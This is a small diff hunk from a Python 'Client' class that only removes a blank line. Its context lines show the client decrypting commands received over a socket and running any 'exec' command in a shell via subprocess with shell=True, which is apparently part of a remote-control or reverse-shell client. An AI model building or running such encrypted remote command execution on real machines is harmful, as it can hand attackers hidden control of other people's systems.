@@ -251,7 +251,6 @@ class Client:
             # command = s.recv(BUFFER_SIZE).decode()
             encrypted_message = s.recv(BUFFER_SIZE)
             command = cipher_suite.decrypt(encrypted_message).decode('utf-8')
-        
             if command[:4] == 'exec':
                 try:
                     result = subprocess.check_output(command[5:], shell=True, text=True)
